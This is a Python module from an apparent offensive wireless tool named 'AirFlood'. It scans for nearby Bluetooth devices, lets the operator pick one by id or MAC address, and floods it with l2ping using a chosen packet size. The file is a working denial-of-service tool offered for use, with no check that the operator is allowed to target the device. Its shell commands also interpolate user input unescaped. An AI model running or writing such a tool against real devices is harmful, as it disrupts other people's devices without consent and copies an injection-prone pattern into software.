import os
import time
import subprocess

from utils import banner

ACCENT = banner.MODULE_THEMES["bluetooth"]["accent"]


def ensure_interface_up(interface):
    status = subprocess.run(["hciconfig", interface], capture_output=True, text=True)
    output = status.stdout + status.stderr

    if status.returncode != 0 or "No such device" in output:
        banner.error(f"bluetooth interface '{interface}' not found")
        raise banner.BackToMenu()

    if "UP RUNNING" in output:
        return

    banner.warn(f"{interface} is down, bringing it up...")
    subprocess.run(["sudo", "hciconfig", interface, "up"])

    status = subprocess.run(["hciconfig", interface], capture_output=True, text=True)
    if "UP RUNNING" not in status.stdout:
        banner.error(f"could not bring {interface} up — check the adapter and try again")
        raise banner.BackToMenu()

    banner.ok(f"{interface} is up")


def get_bluetooth_interface():
    banner.module_banner("bluetooth")
    banner.section("select a bluetooth interface", accent=ACCENT)
    interfaces = subprocess.check_output(
        "hciconfig | grep -E 'hci[0-9]+:|Bus|UP RUNNING|DOWN'", shell=True, text=True
    )
    print()
    print(interfaces)
    interface = banner.prompt("interface (e.g. hci0)", accent=ACCENT)
    ensure_interface_up(interface)
    return interface


def scan_attack():
    while True:
        banner.module_banner("bluetooth")
        banner.section("bluetooth menu", accent=ACCENT)
        choice = banner.menu(
            [
                ("1", "Scan and attack", "discover nearby devices and flood one"),
                ("2", "Back", "return to the AirFlood main menu"),
            ],
            accent=ACCENT,
        )
        if choice == "1":
            bluetooth_interface = get_bluetooth_interface()
            break
        elif choice == "2":
            raise banner.BackToMenu()
        else:
            banner.warn("invalid choice, try again")

    # hcitool's inquiry length is in 1.28s units; the default (8 -> ~10s) often
    # isn't long enough to catch every nearby device, so give it more time
    scan_length = 16  # ~20s
    banner.module_banner("bluetooth")
    banner.section("scanning for devices", accent=ACCENT)
    banner.info(f"scanning for ~{round(scan_length * 1.28)}s, please wait...")
    bluetooth_scan = subprocess.check_output(
        f"hcitool -i {bluetooth_interface} scan --length={scan_length}",
        shell=True, stderr=subprocess.STDOUT, text=True
    )
    lines = bluetooth_scan.splitlines()
    del lines[0]

    array = []
    print()
    print(f"  {'id':<5}{'mac address':<22}{'device name'}")
    print(f"  {'--':<5}{'-----------':<22}{'-----------'}")
    for index, line in enumerate(lines, start=1):
        info = line.split()
        device_mac = info[0]
        device_name = " ".join(info[1:])
        array.append(device_mac)
        print(f"  {index:<5}{device_mac:<22}{device_name}")

    target_id = banner.prompt("target id or mac address", accent=ACCENT)
    try:
        target_address = array[int(target_id) - 1]
    except (ValueError, IndexError):
        target_address = target_id

    if len(target_address) < 1:
        banner.error("target address is missing")
        raise banner.BackToMenu()

    try:
        packet_size = int(banner.prompt("packet size (max: 600)", accent=ACCENT))
        thread_size = int(banner.prompt("threads count", accent=ACCENT))
    except ValueError:
        banner.error("packet size and threads must be integers")
        raise banner.BackToMenu()

    banner.module_banner("bluetooth")
    banner.section("launching attack", accent=ACCENT)
    print(f"  target : {target_address}")
    print(f"  size   : {packet_size}")
    print(f"  threads: {thread_size}")
    banner.countdown(3, "attacking")

    try:
        os.system(f"l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}")
    except KeyboardInterrupt:
        banner.warn("attack aborted")


if __name__ == "__main__":
    try:
        scan_attack()
    except banner.BackToMenu:
        banner.info("bye.")
    except KeyboardInterrupt:
        time.sleep(0.1)
        banner.warn("aborted")
    except Exception as e:
        time.sleep(0.1)
        banner.error(str(e))
